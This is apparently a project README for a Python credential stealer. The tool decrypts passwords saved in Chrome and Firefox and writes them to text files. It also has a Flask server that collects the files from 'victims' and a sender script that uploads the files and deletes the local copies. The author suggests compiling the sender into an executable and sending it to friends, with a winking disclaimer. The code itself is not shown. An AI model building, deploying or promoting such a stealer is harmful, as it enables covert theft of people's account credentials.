# Chrome-Firefox Password Decrypt
This program finds, decrypts and returns two .txt files containing saved passwords.

I'm using modified versions (by me) of [firefox_decrypt](https://github.com/unode/firefox_decrypt "firefox_decrypt") and [decrypt-chrome-passwords](https://github.com/alessio-ds/decrypt-chrome-passwords "decrypt-chrome-passwords")

## Requirements
If you want to get **both** Chrome and Firefox passwords, please use **Python 3.9**.

If you only want to get Chrome passwords, you can use **Python 3.8**.

Once you've chosen which Python version to use, install these dependencies by running:

`pip3 install pycryptodomex pywin32`

## How to use
Run `python chrome-fire-pass.py`.

This will give you two .txt files:
- chrome_passwords.txt
- firefox_passwords.txt

These files will look like this:

    Website:   https://www.github.com/
    Username: 'myemail@gmail.com'
    Password: 'mydecryptedpassword'

### Demonstration:
![](https://i.imgur.com/q4AS816.gif)

## How to host a server
I've created `server.py` and `SEND_chrome-fire_pass.py`.
- `server.py` is used to host a flask based webapp. This will recieve txt files from the "victim" and put it in a newly created folder every time.
- `SEND_chrome-fire_pass.py` sends the two txt files to the server (**please edit line n°24 to change the server to send data to**), then deletes them from the actual folder.

If you wish to use these two programs, run this command first to install the missing dependencies:

`pip3 install requests flask`

Once line n°24 is edited to your server address, a ***smart idea*** would be to compile `SEND_chrome-fire_pass.py` into an .exe and send it to friends. ( ***I'M NOT RESPONSIBLE FOR YOUR ACTIONS*** 😇  )
### Server demonstration:
![](https://i.imgur.com/8TW9Uj1.gif)
